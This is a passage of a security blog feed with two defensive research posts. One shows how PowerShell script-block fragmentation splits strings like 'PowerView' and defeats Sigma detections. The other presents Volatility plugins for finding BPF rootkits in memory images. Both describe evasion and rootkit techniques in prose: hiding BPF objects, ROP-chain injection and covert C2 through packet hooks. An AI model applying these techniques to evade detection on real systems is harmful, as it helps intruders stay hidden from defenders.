4 4 4 \u0026lt;5\u0026gt; 4.3 Potential In-Memory Execution Using Reflection.Assembly 1 1 1 1 1 1 1 1 1 1 1 Potential Suspicious PowerShell Keywords 1 [1] 2 2 2 2 2 2 2 2 2 1.9 PowerView PowerShell Cmdlets - ScriptBlock 27 30 32 34 35 35 36 38 40 45 35.2 Request A Single Ticket via PowerShell 1 1 1 1 1 1 1 1 \u0026lt;2\u0026gt; +1 because of script block cut-off 1 1.1 Usage Of Web Request Commands And Cmdlets - ScriptBlock 1 1 1 1 1 1 1 1 1 1 1 First, let\u0026rsquo;s look at some results that were expected.\n[1] Potential Suspicious PowerShell Keywords: When having only 39 script block fragments, only 1 alarm is generated because all the \u0026ldquo;suspicious\u0026rdquo; strings fitted into the first block - because it is larger compared to the other cases.\n[2] Execute Invoke-command on Remote Host: Goes from 5 to 7 raised alerts - increasing with the number of blocks because the search strings are found in more blocks. Only run 6 with 57 blocks is an outlier, producing less alerts than run 3 with the same amount of 57 blocks. This is getting suspicious..\n[3] Manipulation of User Computer or Group Security Principals Across AD: In all but two runs exactly 4 alarms are generated. The run that raised 5 alarms was the one with the largest number of blocks - so this behavior is expected - but the one with the most alarms (6) only created 54 blocks. Further investigation showed that this is the result of the \u0026ldquo;random\u0026rdquo; script fragmentation, where all 6 \u0026ldquo;suspicious\u0026rdquo; strings were found in 6 different blocks, where in the other runs multiple strings where found in a single block resulting in less alerts.\nOkay, so these results are kind of expected and not too bad. So we should be fine, right?\nWell, when investigating the results of the rule Malicious PowerShell Commandlets - ScriptBlock , a case came true that we thought was extremely unlikely.\nThe case of split \u0026ldquo;PowerVi/ew\u0026rdquo; Among others, the rule Malicious PowerShell Commandlets - ScriptBlock , detects the string \u0026ldquo;PowerView\u0026rdquo; inside script blocks. Now, comparing two different runs, run3 with 57 blocks generated 51 alerts and run2 with 76 blocks generated 61 alerts for this rule. So more blocks -\u0026gt; more alerts, this is fine. But, looking deeper into the script blocks and generated alerts, we noticed something at the end of script block 38 of 57 of run 3.\nAdd-Member Noteproperty \u0026#39;Comment\u0026#39; $Info.lgrpi1_comment\\n $LocalGroup.PSObject.TypeNames.Insert(0, \u0026#39;PowerVi And the beginning of script block 39 of 57:\new.LocalGroup.API\u0026#39;)\\n So, in this case the PowerView script was fragmented in such a way, that a string that should have been detected was no longer detected, i.e., \u0026ldquo;PowerView\u0026rdquo; was split into \u0026ldquo;PowerVi\u0026rdquo; and \u0026ldquo;ew\u0026rdquo;. (To be fair, script block 38 still raised an alarm because the string \u0026ldquo;PowerView\u0026rdquo; occures in it multiple times, but still this example illustrates the problem at hand.)\nLosing alerts This shows, that depending on the fragmentation of script blocks, we can indeed lose alerts and miss contents of scripts that should be detected, e.g., by strings split into two parts in two different blocks. But there are other cases: Rules like Execute Invoke-command on Remote Host detect multiple strings in a single script block (ScriptBlockText|contains|all). Now, when one of those strings is randomly put into a different block, the rule no longer triggers. Although this case should be more likely than the case of \u0026ldquo;search strings split in two\u0026rdquo;, the 10 simulations did not result in such a case since the number of alerts for this specific rule is much smaller (only 5-7 alarms compared to 35-61 for \u0026ldquo;Malicious PowerShell Commandlets - ScriptBlock\u0026rdquo;).\nConclusion We learned that loading the PowerView script multiple times results in fragmentations of it ranging from 39 to 76 blocks. The alerts raised on these script blocks showed the trend of increasing number of alerts with increasing number of script blocks. Although this behavior adds uncertainty to the generation of alerts, it is of no critical nature. But, another example showed, that the fragmentation of scripts into blocks might result in suspicious/malicious strings being split into two blocks, resulting in a case where the search strings could not be found and the detection is completely missed. Furthermore, when searching for multiple strings in a single block, the fragmentation of scripts might result in these strings being split into two different blocks - where detection is also no longer possible.\nIs there a remedy? Maybe re-combining script fragments (like this ) to run detection mechanisms on the reconstructed scripts?\nSidenote: To add, this behavior might also be leveraged by malicious actors to avoid detection\u0026hellip;\nThe described findings were observed on a Windows 10 host with PowerShell Version 5.1 and PowerShell logging configurations according to the recommendations by the Australian Cyber Security Centre (ACSC) which include PowerShell Module and PowerShell Script Block Logging.\n","permalink":"https://lolcads.github.io/posts/2024/04/psscriptblockfragmentation/","tags":["SIEM","ThreatDetection","Sigma","PowerShell","ScriptBlockLogging","Forensics"],"title":"*PowerView* is evil, but *PowerVi* and *ew* are legit, right? - Missing signature-based detections due to PowerShell Script Block Logging Fragmentation"},{"categories":null,"content":"BPF Memory Forensics with Volatility 3 Introduction and Motivation Have you ever wondered how an eBPF rootkit looks like? Well, here\u0026rsquo;s one, have a good look:\nUpon receiving a command and control (C2) request, this specimen can execute arbitrary commands on the infected machine, exfiltrate sensitive files, perform passive and active network discovery scans (like nmap), or provide a privilege escalation backdoor to a local shell. Of course, it\u0026rsquo;s also trying its best to hide itself from system administrators hunting it with different command line tools such as ps, lsof, tcpdump an others or even try tools like rkhunter or chkrootkit.\nWell, you say, rootkits have been doing that for more than 20 years now, so what\u0026rsquo;s the news here? The news aren\u0026rsquo;t that much the features, but rather how they are implemented. Everything is realized using a relatively new and rapidly evolving kernel feature: eBPF. Even though it has been in the kernel for almost 10 years now, we\u0026rsquo;re regularly surprised by how many experienced Linux professionals are still unaware of its existence, not even to mention its potential for abuse.\nThe above picture was generated from the memory image of a system infected with ebpfkit , an open-source PoC rootkit from 2021, using a plugin for the Volatility 3 memory forensics framework. In this blog post, we will present a total of seven plugins that, taken together, facilitate an in depth analysis of the state of the BPF subsystem.\nWe structured this post as follows: The next section provides an introduction to the BPF subsystem, while the third section highlights its potential for (ab)use by malware. In section four, we will introduce seven Volatility 3 plugins that facilitate the examination of BPF malware. Section five presents a case study, followed by a section describing our testing and evaluation of the plugins on various Linux distributions. In the last section, we conclude with a discussion of the steps that are necessary to integrate our work into the upstream Volatility project, other challenges we encountered, and open research questions.\nNote: The words \u0026ldquo;eBPF\u0026rdquo; and \u0026ldquo;BPF\u0026rdquo; will be used interchangeably throughout this post.\nThe BPF Subsystem Before delving into the complexities of memory forensics, it is necessary to establish some basics about the BPF subsystem. Readers that are already familiar with the topic can safely skip this section.\nTo us, BPF is first of all an instruction set architecture (ISA). It has ten general purpose registers, which are 64 bit wide, and there are all of the basic operations that you would expect a modern ISA to have. Its creator, Alexei Starovoitov, once described it as a kind of simplified x86-64 and would probably never have imagined that the ISA he cooked up back in 2014 would once enter a standardization process at the IETF. The interested reader can find the current proposed standard here . Of course, there are all the other things that you would expect to come with an ISA, like an ABI that defines the calling convention, and a binary encoding that maps instructions to sequences of four or eight bytes.\nThe BPF ISA is used as a compilation target (currently by clang - gcc support is on the way) for programs written in high-level languages (currently C and Rust), however, it is not meant to be implemented in hardware. Therefore, it is conceptually more similar to WebAssembly or Java Bytecode than x86-64 or arm64, i.e., BPF programs are meant to be executed by a runtime that implements the BPF virtual machine (VM). Several BPF runtimes exist, but the \u0026ldquo;reference implementation” is in the Linux kernel.\nRuntimes are, of course, free to choose how they implement the BPF VM. The instruction set was defined in a way that makes it easy to implement a one-to-one just in time (JIT) compiler for many CPU architectures. In fact, in the Linux kernel, even non-mainstream architectures like powerpc, sparc or s390 have BPF JITs. However, the kernel also has an interpreter to run BPF programs on architectures that do not yet support JIT compilation.\nAside: The BPF platform is what some call a \u0026ldquo;verified target\u0026rdquo;. This means that in order for a program to be valid it has to have some \u0026ldquo;non-local\u0026rdquo; properties. Those include the absence of (unbounded) loops, registers and memory can only be read after they have been written to, the stack depth may not exceed a hard limit, and many more. The interested reader can find a more exhaustive description here . In practice, runtime implementations include an up-front static verification stage and refuse to execute programs that cannot be proven to meet these requirements (some runtime checks may be inserted to account for the known shortcomings of static analysis). This static verification approach is at the hearth of BPF\u0026rsquo;s sandboxing model for untrusted code.\nRoughly speaking, the BPF subsystem includes, besides the implementation of the BPF VM, a user and kernel space interface for managing the program life cycle as well as infrastructure for transitioning the kernel control flow in and out of programs running inside the VM. Other subsystems can be made \u0026ldquo;programmable\u0026rdquo; by integrating the BPF VM in places where they want to allow the calling of user-defined functions, e.g., for decision making based on their return value. The networking subsystem, for example, supports handing all incoming and outgoing packets on an interface to a BPF program. Those programs can freely rewrite the packet buffer or even decide to drop the packet all together. Another example is the tracing subsystem that supports transitioning control into BPF programs at essentially any instruction via one of the various ways it has to hook into the kernel and user space execution. The final example here is the Linux Security Module (LSM) subsystem that supports calling out to BPF programs at any of its security hooks placed at handpicked choke points in the kernel. There are many more examples of BPF usage in the kernel and even more in academic research papers and patches on the mailing list, but we guess we conveyed the general idea.\nBPF programs can interact with the world outside of the VM via so called helpers or kfuncs, i.e., native kernel functions that can be called by BPF programs. Services provided by these functions range from getting a timestamp to sending a signal to the current task or reading arbitrary memory. Which functions a program can call depends on the program type that was selected when loading it into the VM. When reversing BPF programs, looking for calls to interesting kernel functions is a good point to start.\nThe second ingredient you need in order to get any real work done with a BPF program are maps. While programs can store data during their execution using stack memory or by allocating objects on the heap, the only way to persist data across executions of the same program are maps. Maps are mutable persistent key value stores that can be accessed by BPF programs and user space alike, as such they can be used for user-to-BPF, BPF-to-user, or BPF-to-BPF communication, where in the last case the communicating programs may be different or the same program at different times.\nAnother relevant aspect of the BPF ecosystem is the promise of compile once run everywhere (CORE), i.e., a (compiled) BPF program can be run inside of a wide range of Linux kernels that might have different configurations, versions, compilers, and even CPU architectures. This is achieved by having the compiler emit special relocation entries that are processed by a user-space loader prior to loading a program into the kernel\u0026rsquo;s BPF VM. The key ingredient that enables this approach is a self-description of the running kernel in the form of BPF Type Format (BTF) information, which is made available in special files under /sys/kernel/btf/. For example, BPF source code might do something like current-\u0026gt;comm to access the name of the process in whose context the program is running. This might generate an assembly instruction that adds the offset of the comm field to a pointer to the task descriptor that is stored in a register, i.e., ADD R5, IMM. However, the immediate offset might vary due to kernel version, configuration, structure layout randomization or CPU architecture. Thus, the compiler would emit a relocation entry that tells the user-space loader running on the target system to check the kernel\u0026rsquo;s BTF information in order to overwrite the placeholder with the correct offset. Together with other kinds of relocations, which address things like existence of types and enum variants or their sizes, the loader be used to run the same BPF program on a considerable number of kernels.\nAside: A problem with the CORE implementation described above is that signatures over BPF programs are meaningless as the program text will be altered by relocations before loading. To allow for a meaningful ahead of time signature there is another approach in which a loader program is generated for the actual program. The loader program is portable without relocations and is signed and loaded together with the un-relocated bytecode of the actual program. Thus, the problem is solved as all text relocations happen in the kernel, i.e., after signatures have been verified.\nHowever, there are of course limits to the portability of BPF programs. As we all know, the kernel takes great care to never break user space, within kernel land, on the other hand, there are no stability guarantees at all. BPF programs are not considered to be part of user space and thus there are no forward or backward compatibility guarantees. In practice, that means that APIs exposed to BPF could be removed or changed, attachment points could vanish or change their signature, or programs that are currently accepted by the static verifier could be rejected in the future. Furthermore, changes in kernel configuration could remove structure fields, functions, or kernel APIs that programs rely on. In that sense, BPF programs are in a position similar to out-of-tree kernel modules. That being said, due to CORE, there is no need to have the headers of the target kernel available at compile time and thus a lot less knowledge about the target is needed to be confident that the program will be able to run successfully. Furthermore, in the worst case the program will be rejected by the kernel, but there are no negative implications on system stability by attempting to load it.\nFinally, we should mention that BPF is an entirely privileged interface. There are multiple BPF-related capabilities that a process can have, which open up various parts of the subsystem. This has not always been the case. A few years ago, unprivileged users were able to load certain types of BPF programs, however, access to the BPF VM comes with two potential security problems. First, the security entirely relies on the correctness of the static verification stage, which is notoriously complex and must keep up with the ever-expanding feature set. It has been demonstrated that errors in the verification process can be exploited for local privilege escalation, e.g., CVE-2020-8835 or CVE-2021-3490 . Second, even within the boundaries set by the verifier, the far-reaching control over the CPU instructions that get executed in kernel mode opens up the door for Spectre attacks, c.f., Jann Horn\u0026rsquo;s writeup or the original Spectre paper . For those reasons, the kernel community has decided to remove unprivileged access to BPF by default .\nBPF Malware To better understand the implications the addition of the BPF VM has for the Linux malware landscape, we would like to start with a quote from \u0026ldquo;BPF inventor\u0026rdquo; Alexei Starovoitov: \u0026ldquo;If in the past the whole kernel would maybe be [a] hundred of programmers across the world, now a hundred thousand people around the world can program the kernel thanks to BPF.\u0026rdquo;, i.e., BPF significantly lowers the entry barrier to kernel programming and shipping applications that include kernel-level code. While the majority of new kernel programmers are well-intentioned and aim to develop innovative and useful applications, experience has shown that there will be some actors who seek to use new kernel features for malicious purposes.\nFrom a malware author\u0026rsquo;s perspective, one of the first questions is probably how likely it is that a target system will support the loading of malicious BPF programs. According to our personal experience it is safe to say that most general-purpose desktop and server distributions enable BPF. The feature is also enabled in the android-base.config as BPF plays a significant role in the Android OS, i.e., essentially every Android device should support BPF - from your fridge to your phone. Concerning the custom kernels used by big tech companies let me quote Brendan Gregg, another early BPF advocate: \u0026ldquo;As companies use more and more eBPF also, it becomes harder for your operating system to not have eBPF because you are no longer eligible to run workloads at Netflix or at Meta or at other companies.\u0026rdquo;. What is more, Google relies on BPF (through cilium ) in its Kubernetes engine and Facebook uses it for its layer 4 load balancer katran . For a more comprehensive survey of BPF usage in cloud environments we recommend section 5 of Cross Container Attacks: The Bewildered eBPF on Clouds by Yi He et al. Thus, most of the machines that constitute \u0026ldquo;the cloud\u0026rdquo; are likely to support BPF. This is particularly interesting as signature verification for BPF programs is still not available, making it the only way to run kernel code on locked-down systems that restrict the use of kernel modules.\nHowever, enabling the BPF subsystem, i.e., CONFIG_BPF, is only the beginning of the story. There are many compile-time or run-time configuration choices that affect the capabilities granted to BPF programs, and thus the ways in which they can be used to subvert the security of a system. Giving a full overview of all the available switches and their effect would exceed the scope of this post, however, we will mention some knobs that can be turned to stop the abuses mentioned below.\nIf you search for the term “BPF malware” these days, you will find rather sensational articles with titles like \u0026ldquo;eBPF: A new frontier for malware\u0026rdquo;, \u0026ldquo;How BPF-Enabled Malware Works\u0026rdquo;, \u0026ldquo;eBPF Offensive Capabilities – Get Ready for Next-gen Malware\u0026rdquo;, \u0026ldquo;Nothing is Safe Anymore - Beware of the “eBPF Trojan Horse” or \u0026ldquo;HOW DOES EBPF MALWARE PERFORM AGAINST STAR LAB’S KEVLAR EMBEDDED SECURITY?\u0026rdquo;. Needless to say, that they contain hardly any useful information. The truth is that we are not aware of any reports of in-the-wild malware using BPF. Nevertheless, there is no shortage in open source PoC BPF malwares on GitHub. The two biggest ones are probably ebpfkit and TripeCross , however, there are many smaller projects like nysm , sshd_backdoor , boopkit , pamspy , or bad bpf as well as snippet collections like nccgroup\u0026rsquo;s bpf tools , Offensive-BPF . Researchers also used malicious BPF programs to escape container isolation in multiple real-world cloud environments.\nThere are a couple of core shenanigans that those malwares are constructed around, three of which we will briefly describe here.\nIt is possible to transparently (for user space) skip the execution of any system call or to manipulate just the return value after it was executed. This is since BPF can be used for the purpose of error injection . To be precise, any function that is annotated with the ALLOW_ERROR_INJECTION macro can be manipulated in this way, and every system call is automatically annotated via the macro that defines it. One would hope that the corresponding configurations BPF_KPROBE_OVERRIDE and CONFIG_FUNCTION_ERROR_INJECTION would not be enabled in kernels shipped to end users, but they are. There are many things that one can do by lying to user space in this way, one example would be to block the sending of all signals to a specific process, e.g., to protect it from being killed . Interestingly, the same helper is also used by BPF-based security solutions like tetragon , which are deployed in production cloud environments.\nAnother common primitive is to write to memory of the current process, which gives attackers the power to perform all sorts of interesting memory corruptions. One of the more original ideas is to inject code into a process by writing a ROP chain onto its stack. The chain sets up everything to load a shared library and cleanly resumes the process afterwards. More generally, the helper bpf_probe_write_user is involved in many techniques to hide objects, e.g., sockets or BPF programs, from user space or when manipulating apparent file and directory contents, e.g., /proc, /etc/sudoers or ~/.ssh/authorized_keys. In particular, those apparent modifications cannot be caught with file system forensics as they are only happening in the memory of the process that attempts to access the resource, e.g., see textreplace for an example that allows arbitrary apparent modifications of file contents. While there are in fact a couple of legitimate programs (like the Datadog-agent ) using this function, it is probably wise to enable CONFIG_LOCK_DOWN_KERNEL_FORCE_INTEGRITY before compilation.\nA rather peculiar aspect of BPF malware is how it communicates over the network. BPF programs are not able to initiate network connections by themselves, but as one of the main applications of BPF is in the networking subsystem, they have far-reaching capabilities when it comes to managing existing traffic. For example, XDP programs get their hands on packets very early in the receive path, long before mechanisms like netfilter, which is much further up the network stack, get a chance to see them. In fact, there are high-end NICs that support running BPF programs on the device\u0026rsquo;s proces rather than the host CPU. Furthermore, programs that handle packets can usually modify, reroute, or drop them. In combination, this is often used to receive C2 commands while at the same time hiding the corresponding packets from the rest of the kernel by modifying or dropping them. In addition, BPF\u0026rsquo;s easy programmability makes it simple to implement complex, stateful triggers. To exfiltrate data from the system, the contents, and potentially also the recipient data, of outgoing packets are modified, for example by traffic control (tc) hooks. For unreliable transport protocols higher layers will deal with the induced packet loss, while for TCP the retransmission mechanism ensures that applications will not be impacted. Turn off CONFIG_NET_CLS_BPF and CONFIG_NET_ACT_BPF to disable tc BPF programs.\nWhile the currently charted BPF malware landscape is limited to hobby projects by security researchers and other interested individuals, it would unfortunately not be unheard of that the same projects are eventually discovered during real-world incidents. Advanced Linux malwares, on the other hand, will most likely choose to implement their own BPF programs when they believe that it is beneficial for their cause, for instance to avoid detection by using a mechanism that is not yet well known to the forensic community. Some excerpts from the recent talk by Kris Nova at DevOpsDays Kyiv give an interesting insight into the concerns that the Ukrainian computer security community had, and still has, regarding the use of BPF in Russian attacks on their systems.\nIt would be dishonest to claim that there is a general schema that you can follow while analyzing an incident to discover all malicious BPF programs. As so often, the boundaries between monitoring software, live patches, security solutions and malware are not clearly defined, e.g., in addition to bpf_override_retun tetragon also uses bpf_send_singal. The first step could be to obtain a baseline of expected BPF-related activity, and carefully analyze any deviations or anomalies. Additionally, a look at the kernel configuration can help to decide which kinds of malicious activity are fundamentally possible. Furthermore, programs that make use of possibly malicious helper functions, like bpf_probe_wite_user, bpf_send_signal, bpf_override_return, or bpf_skb_store_bytes should be reverse engineered with particular scrutiny. In addition, there are some clear indicators of malicious activity, like the hiding of programs, which we will discuss in more detail below. Finally, once program signatures are upstreamed, it is highly recommended to enable and enforce them to lock down this attack surface.\nFrom now on, we will shift gears and focus on the main topic of this post, hunting BPF malware in main memory images.\nAside: The bvp47 , Symbiote and BPFdoor rootkits are often said to be examples of BPF malware. However, they are using only what is now known as classic BPF, i.e., the old-school packet filtering programs used by programs like tcpdump.\nVolatility Plugins Volatility is a memory forensics framework that can be used to analyze physical memory images. It uses information about symbols and types of the operating system that was running on the imaged system to recover high-level information, like the list of running processes or open files, from the raw memory image.\nIndividual analyses are implemented as plugins that make use of the framework library as well as other plugins. Some of those plugins are closely modeled after core unix utilities, like the ps utility for listing processes, the ss utility for listing network connections or the lsmod utility for listing kernel modules. Other plugins implement checks that search for common traces of kernel rootkit activity, like the replacement of function pointers or inline hooks.\nThere may be multiple ways to obtain the same piece of information, and thus multiple plugins that, on first sight, serve the same purpose. Inconsistencies between the methods, however, could indicate malicious activity that tries to hide its presence or just be artifacts of imperfections in the acquisition process. In any case, inconsistencies are something an investigator should look into.\nIn this section we present seven Volatility plugins that we have developed to enable analysis of the BPF subsystem. Three of these are modelled after subcommands of the bpftool utility and provide basic functionality. We then present three plugins that retrieve similar information from other sources and can thus be used to detect inconsistencies. Finally, we present a plugin that aggregates information from four other plugins to make it easier to interpret.\n_Note: We published the source code for all of our plugins on GitHub . We would love to see your contributions there! :)\nListing Programs, Maps \u0026amp; Links Arguably the most basic task that you could think of is simply listing the programs that have been loaded into the BPF VM. We will start by doing this on a live system, feel free to follow along in order to discover what your distribution or additional packages that you installed have already loaded.\nLive System The bpftool user-space utility allows admins to interact with the BPF subsystem. One of the most basic tasks it supports is the listing of all loaded BPF programs, maps, BTF sections, or links. We are sometimes going to refer to these things collectively as BPF objects. Roughly speaking, links are a mechanism to connect a loaded program to a point where it is being invoked, and BTF is a condensed form of DWARF debug information.\nLets start with an example to get familiar with the information that is displayed (run btftool as root):\n# bpftool prog list [...] 22: lsm name restrict_filesystems tag 713a545fe0530ce7 gpl loaded_at 2023-11-26T10:31:42+0100 uid 0 xlated 560B jited 305B memlock 4096B map_ids 13 btf_id 53 [...] From left-to-right and top-to-bottom we have: ID used as an identifier for user-space, program type, program name, tag that is a SHA1 hash over the bytecode, license, program load timestamp, uid of process that loaded it, size of the bytecode, size of the jited code, memory blocked by the program, ids of the maps that the program is using, ids to the BTF information for the program.\nWe can also inspect the bytecode\n# bpftool prog dump xlated id 22 int restrict_filesystems(unsigned long long * ctx): ; int BPF_PROG(restrict_filesystems, struct file *file, int ret) 0: (79) r3 = *(u64 *)(r1 +0) 1: (79) r0 = *(u64 *)(r1 +8) 2: (b7) r1 = 0 [...] where each line is the pseudocode of a BPF assembly instruction and we even have line info, which is also stored in the attached BTF information. We can also dump the jited version and confirm that is is essentially a one-to-one translation to x86_64 machine code (depending on the architecture your kernel runs on):\n# bpftool prog dump jited id 22 int restrict_filesystems(unsigned long long * ctx): bpf_prog_713a545fe0530ce7_restrict_filesystems: ; int BPF_PROG(restrict_filesystems, struct file *file, int ret) 0:\tendbr64 4:\tnopl\t(%rax,%rax) 9:\tnop b:\tpushq\t%rbp c:\tmovq\t%rsp, %rbp f:\tendbr64 13:\tsubq\t$24, %rsp 1a:\tpushq\t%rbx 1b:\tpushq\t%r13 1d:\tmovq\t(%rdi), %rdx 21:\tmovq\t8(%rdi), %rax 25:\txorl\t%edi, %edi [...] Furthermore, we can display basic information about the maps used by the program\n# bpftool map list id 13 13: hash_of_maps name cgroup_hash flags 0x0 key 8B value 4B max_entries 2048 memlock 165920B as well as their contents (which are quite boring in this case).\n# bpftool map dump id 13 Found 0 elements We can also get information about the variables and types (BTF) defined in the program. This is somewhat comparable to the DWARF debug information that comes with some binaries - just that it is harder to strip since its needed by the BPF VM.\n# bpftool btf dump id 53 [1] PTR \u0026#39;(anon)\u0026#39; type_id=3 [2] INT \u0026#39;int\u0026#39; size=4 bits_offset=0 nr_bits=32 encoding=SIGNED [3] ARRAY \u0026#39;(anon)\u0026#39; type_id=2 index_type_id=4 nr_elems=13 [4] INT \u0026#39;__ARRAY_SIZE_TYPE__\u0026#39; size=4 bits_offset=0 nr_bits=32 encoding=(none) [5] PTR \u0026#39;(anon)\u0026#39; type_id=6 [6] TYPEDEF \u0026#39;uint64_t\u0026#39; type_id=7 [7] TYPEDEF \u0026#39;__uint64_t\u0026#39; type_id=8 [8] INT \u0026#39;unsigned long\u0026#39; size=8 bits_offset=0 nr_bits=64 encoding=(none) [9] PTR \u0026#39;(anon)\u0026#39; type_id=10 [10] TYPEDEF \u0026#39;uint32_t\u0026#39; type_id=11 [11] TYPEDEF \u0026#39;__uint32_t\u0026#39; type_id=12 [12] INT \u0026#39;unsigned int\u0026#39; size=4 bits_offset=0 nr_bits=32 encoding=(none) [13] STRUCT \u0026#39;(anon)\u0026#39; size=24 vlen=3 \u0026#39;type\u0026#39; type_id=1 bits_offset=0 \u0026#39;key\u0026#39; type_id=5 bits_offset=64 \u0026#39;value\u0026#39; type_id=9 bits_offset=128 [...] As we said earlier, links are what connects a loaded program to a point that invokes it.\n# bpftool link list [...] 3: tracing prog 22 prog_type lsm attach_type lsm_mac target_obj_id 1 target_btf_id 82856 Again, from left-to-right and top-to-bottom we have: ID, type, attached program\u0026rsquo;s ID, program\u0026rsquo;s load type, type that program was attached with, ID of the BTF object that the following field refers to, ID of the type that the program is attached to (functions can also have BTF entries). Note that everything but the first line depends on the type of link that is examined. To find the point where the program is called by the kernel we can inspect the relevant BTF object (the kernel\u0026rsquo;s in this case).\n# bpftool btf dump id 1 | rg 82856 [82856] FUNC \u0026#39;bpf_lsm_file_open\u0026#39; type_id=16712 linkage=static Thus we can conclude that the program is invoked early in the do_dentry_open function via the security_file_open LSM hook and that its return value decides whether the process will be allowed to open the file (we\u0026rsquo;re skipping some steps here, see our earlier article for the full story).\nWe performed this little \u0026ldquo;live investigation\u0026rdquo; on a laptop running Arch Linux with kernel 6.6.2-arch1-1 and the program wasn\u0026rsquo;t malware but rather loaded by systemd on boot. You can find the commit that introduced the feature here . Again, you can see that in the future there will be more legitimate BPF programs running on your systems (servers, desktops and mobiles) than you might think!\nMemory Image As a first step towards BPF memory forensics it would be nice to be able to perform the above investigation on a memory image. We will now introduce three plugins that aim to make this possible.\nWe already saw that all sorts of BPF objects are identified by an ID. Internally, these IDs are allocated using the IDR mechanism , a core kernel API. For that purpose, three variables are defined at the top of /kernel/bpf/syscall.c.\n[...] static DEFINE_IDR(prog_idr); static DEFINE_SPINLOCK(prog_idr_lock); static DEFINE_IDR(map_idr); static DEFINE_SPINLOCK(map_idr_lock); static DEFINE_IDR(link_idr); static DEFINE_SPINLOCK(link_idr_lock); [...] Under the hood, the ID allocation mechanism uses an extensible array (xarray) , a tree-like data structure that is rooted in the idr_rt member of the structure that is defined by the macro. The ID of a new object is simply an unused index into the array, and the value stored at this index is a pointer to a structure that describes it. Thus, we can re-create the listing capabilities of bpftool by simply iterating the array. You can find the code that does so in the XArray class.\nDereferencing the array entries leads us to structures that hold most of the information displayed by bpftool earlier.\nEntries of the prog_idr point to objects of type bpf_prog , the aux member of this type points to a structure that hols additional information about the program. We can see how the information bpftool displays is generated from these structures in the bpf_prog_get_info_by_fd function by filling a bpf_prog_info struct. The plugin bpf_listprogs re-implements some of the logic of this functions and displays the following pieces of information.\ncolumns: list[tuple[str, type]] = [ (\u0026#34;OFFSET (V)\u0026#34;, str), (\u0026#34;ID\u0026#34;, int), (\u0026#34;TYPE\u0026#34;, str), (\u0026#34;NAME\u0026#34;, str), (\u0026#34;TAG\u0026#34;, str), (\u0026#34;LOADED AT\u0026#34;, int), (\u0026#34;MAP IDs\u0026#34;, str), (\u0026#34;BTF ID\u0026#34;, int), (\u0026#34;HELPERS\u0026#34;, str), ] Some comments are in order:\nOFFSET (V) are the low 6 bytes of the bpf_prog structure\u0026rsquo;s virtual address. This is useful as a unique identifier of the structure. LOADED AT is the number of nanoseconds since boot when the program was loaded. Converting it to an absolute timestamp requires parsing additional kernel time-keeping structures and is not in scope for this plugin. There exist Volatility patches that add this functionality but they are not upstream yet. Once they are, it should be trivial to convert this field to match the bpftool output. HELPERS is a field that is not reported by bpftool. It displays a list of all the kernel functions that are called by the BPF program, i.e., BPF helpers and kfuncs, and is helpful to quickly identify programs that use possibly malicious or non-standard helpers. The reporting of memory utilization is omitted as we consider it to be less important for forensic investigations, however, it would be easy to add. The second bpftool functionality the plugin supports is the dumping of programs in bytecode and jited forms. To dump the machine code of the program, we follow the bpf_func pointer in the bpf_prog structure, which points to the entrypoint of the jited BPF program. The length of the machine code is stored in the jited_len field of the same structure. While we support dumping the raw bytes to a file, their analysis is tedious due to missing symbol information. Thus, we also support disassembling the program and annotating all occurring addresses with the corresponding symbol, which makes the programs much easier to analyze.\nDumping the BPF bytecode is straightforward as well. The flexible insni array member of the bpf_prog structure holds the bytecode instructions and the len field holds their number. Here, we also support dumping the raw and disassembled bytecode. However, the additional symbol annotations are not implemented. As the bytecode is not \u0026ldquo;what actually runs\u0026rdquo;, we consider this information more susceptible to anti-forensic tampering and thus focused on the machine code, which is what is executed when invoking the program.\nNote: We use Capstone for disassembling the BPF bytecode. Unfortunately, Capstone\u0026rsquo;s BPF architecture is outdated and thus bytecode is sometimes not disassembled entirely. As a workaround, you can dump the raw bytes and use another tool to disassemble them.\nEntries of the map_idr point to bpf_map objects. The bpf_map_info structure parsed by bpftool is filled in bpf_map_get_info_by_fd and the plugin bpf_listmaps is simply copying the logic to display the following pieces of information.\ncolumns: list[tuple[str, Any]] = [ (\u0026#34;OFFSET (V)\u0026#34;, str), (\u0026#34;ID\u0026#34;, int), (\u0026#34;TYPE\u0026#34;, str), (\u0026#34;NAME\u0026#34;, str), (\u0026#34;KEY SIZE\u0026#34;, int), (\u0026#34;VALUE SIZE\u0026#34;, int), (\u0026#34;MAX ENTRIES\u0026#34;, int), ] Dumping the contents of maps is hard due to the diversity in map types. Each map type requires its own handling, beginning with manually downcasting the bpf_map object to the correct container type. One approach to avoid implementing each lookup mechanism separately, would be through emulation of the map_get_next_key and bpf_map_copy_value kernel functions, where the former is a function pointer found in the map\u0026rsquo;s operations structure. However, this is not in scope for the current plugin.\nFurthermore, the dumping could be enhanced by utilizing the BTF information that is optionally attached to the map to properly display keys and values, similar to the bpf_snprintf_btf helper that can be used to pretty-print objects using their BTF information.\nWe implemented the dumping for the most straightforward map type - arrays - but the plugin does not support dumping other types of maps.\nEntries of the link_idr point to objects of type bpf_link . Again, there is an informational structure, bpf_link_info , which is this time filled in the bpf_link_get_info_by_fd function. By analyzing this function, we wrote the bpf_listlinks plugin that retrieves the following pieces of information.\ncolumns: list[tuple[str, Any]] = [ (\u0026#34;OFFSET (V)\u0026#34;, str), (\u0026#34;ID\u0026#34;, int), (\u0026#34;TYPE\u0026#34;, str), (\u0026#34;PROG\u0026#34;, int), (\u0026#34;ATTACH\u0026#34;, str), ] Here, the last column is obtained by mimicking the virtual call to link-\u0026gt;ops-\u0026gt;fill_link_info that adds link-type specific information about the associated attachment point, e.g., for tracing links it adds the BTF object and type IDs we saw earlier.\nLSM Hooks Our three listing plugins have one conceptual weakness in common: they rely entirely on information obtained by parsing the (prog|map|link)_idrs. However, the entire ID mechanism is in the user-facing part of the BPF subsystem, its simply a means for user space to refer to BPF objects in syscalls. Thus, our plugins are susceptible to trivial anti-forensic tampering.\nIn our research, we prototyped two anti-forensic methods that remove BPF objects from these structures while still keeping the corresponding program active in the kernel. First, the more straightforward way is to simply write a kernel module that uses standard APIs to remove IDs from the IDRs. The second one is based on the observation that the lifecycle of BPF objects is managed via reference counts. Thus, if we artificially increment the reference count of an object that (indirectly) holds references to all other objects that are required to operate a BPF program, e.g., a link, we can prevent the program\u0026rsquo;s destruction when all \u0026ldquo;regular\u0026rdquo; references are dropped.\nOne approach to counter these anti-forensic measures is to \u0026ldquo;approach from the other side\u0026rdquo;. Instead of relying on information from sources that are far detached from the actual program execution, we go to the very places and mechanisms that invoke the program. The downside is obviously that this low-level code is much more program-type and architecture specific, the results, on the other hand, are more robust.\nIn a previous blog post we described the low-level 